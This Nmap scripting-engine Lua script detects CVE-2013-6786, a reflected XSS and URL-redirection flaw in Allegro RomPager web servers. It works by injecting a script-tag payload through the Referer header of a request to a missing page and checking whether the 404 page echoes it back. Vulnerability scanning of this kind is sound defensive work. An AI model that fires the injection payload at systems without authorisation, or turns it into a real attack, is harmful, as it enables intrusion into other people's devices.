description = [[
Detects a URL redirection and reflected XSS vulnerability in Allegro RomPager
Web server. The vulnerability has been assigned CVE-2013-6786.

The check is general enough (script tag injection via Referer header) that some
other software may be vulnerable in the same way.
]]

---
-- @usage nmap -p80 --script http-rompager-xss <target>
-- @usage nmap -sV http-rompager-xss <target>
--
-- @output
-- PORT   STATE SERVICE
-- 80/tcp open  http
-- | http-rompager-xss:
-- |   VULNERABLE:
-- |   URL redirection and reflected XSS vulnerability in Allegro RomPager Web server
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2013-6786
-- |
-- |     Devices based on Allegro RomPager web server are vulnerable to URL redirection
-- |     and reflected XSS. If Referer header in a request to a non existing page, data
-- |     can be injected into the resulting 404 page. This includes linking to an
-- |     untrusted website and XSS injection.
-- |     Disclosure date: 2013-07-1
-- |     References:
-- |_      https://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf
---

author = "Vlatko Kosturjak <kost@linux.hr>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit","vuln"}

local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local string = require "string"
local vulns = require "vulns"
local stdnse = require "stdnse"

portrule = shortport.http

action = function(host, port)
  local vuln = {
    title = 'URL redirection and reflected XSS vulnerability in Allegro RomPager Web server',
    state = vulns.STATE.NOT_VULN,
    description = [[
Devices based on Allegro RomPager web server are vulnerable to URL redirection
and reflected XSS. If Referer header in a request to a non existing page, data
can be injected into the resulting 404 page. This includes linking to an
untrusted website and XSS injection.]],
    IDS = {
      CVE = "CVE-2013-6786",
      OSVDB = "99694",
    },
    references = {
      'https://antoniovazquezblanco.github.io/docs/advisories/Advisory_RomPagerXSS.pdf',
    },
    dates = {
      disclosure = {year = '2013', month = '07', day = '1'},
    },
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local header = { ["Referer"] = '"><script>alert("XSS")</script><"' }
  local open_session = http.get(host.ip, port, "/"..stdnse.generate_random_string(16), { header = header })
  if open_session and open_session.status == 404 then
    stdnse.debug2("got 404-that's good!")
    if open_session.body:match('"><script>alert%("XSS"%)</script><"') then
      vuln.state = vulns.STATE.EXPLOIT
      -- vuln.extra_info = open_session.body
      stdnse.debug1("VULNERABLE. Router answered correctly!")
      return vuln_report:make_output(vuln)
    end
  end
end
